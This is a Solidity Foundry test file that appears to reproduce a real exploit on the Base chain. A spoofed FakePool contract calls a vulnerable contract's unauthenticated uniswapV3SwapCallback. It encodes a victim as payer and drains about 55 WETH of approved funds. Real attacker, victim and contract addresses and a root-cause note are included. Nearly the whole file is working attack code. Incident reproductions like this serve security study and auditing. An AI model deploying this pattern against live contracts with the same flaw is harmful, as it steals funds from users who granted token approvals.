// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~55 WETH (~$220K)
// Attacker : https://basescan.org/address/0x2a49c6fd18bd111d51c4fffa6559be1d950b8eff
// Attack Contract : https://basescan.org/address/0xf1a3686f4d394e52d9fdf60132e46ebdcd231b01
// Vulnerable Contract : https://basescan.org/address/0xE143b486ab0413Df0D6DAd2caf6d2f61CAC54730
// Attack Tx : https://basescan.org/tx/0x4449114ceaedd11e8f1363c5e53507198323a63cb6958dc26078fc016d0d4b27
// Victim (approver) : https://basescan.org/address/0xc0ffee479e4cd49eafba87449225e17c53251226

// @Analysis
// Twitter Guy : https://x.com/CertiKAlert/status/1983742817022439822
// Root cause : public uniswapV3SwapCallback lacks real pool auth — only calls
// msg.sender.token0() then transferFrom(payer, msg.sender, amount0Delta) using
// attacker-controlled callback data (payer, recipient encoding).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IVulnerable {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

address constant WETH = 0x4200000000000000000000000000000000000006;
address constant VULN = 0xE143b486ab0413Df0D6DAd2caf6d2f61CAC54730;
address constant VICTIM = 0xc0fFeE479E4cD49eafBA87449225e17c53251226;

/// @dev Minimal pool spoof — victim only checks msg.sender.token0().
contract FakePool {
    function token0() external pure returns (address) {
        return WETH;
    }

    function token1() external pure returns (address) {
        return WETH;
    }

    function exploit(uint256 amount) external {
        // data = abi.encode(payer, recipient) as used in the live attack
        bytes memory data = abi.encode(VICTIM, address(this));
        // positive amount0Delta triggers transferFrom of token0 (WETH)
        // amount1Delta negative (as in live tx) — value does not gate the pull
        IVulnerable(VULN).uniswapV3SwapCallback(int256(amount), -1, data);
    }
}

contract BaseSwapCallback is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 37_487_848; // attack block 37487849 - 1
    FakePool internal fake;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8548", blocknumToForkFrom);
        fundingToken = WETH;
        fake = new FakePool();
    }

    function testExploit() public balanceLog {
        uint256 victimBal = IERC20(WETH).balanceOf(VICTIM);
        uint256 allowance = IERC20(WETH).allowance(VICTIM, VULN);
        console.log("Victim WETH balance", victimBal);
        console.log("Victim->Vuln allowance", allowance);

        uint256 drain = victimBal < allowance ? victimBal : allowance;
        require(drain > 0, "nothing to drain");

        fake.exploit(drain);

        uint256 got = IERC20(WETH).balanceOf(address(fake));
        console.log("Drained WETH to FakePool", got);
        // Sweep to this test contract for balanceLog
        vm.prank(address(fake));
        IERC20(WETH).transfer(address(this), got);

        assertEq(IERC20(WETH).balanceOf(VICTIM), 0, "victim not emptied");
        assertGt(IERC20(WETH).balanceOf(address(this)), 50 ether, "expected ~55 WETH");
    }
}
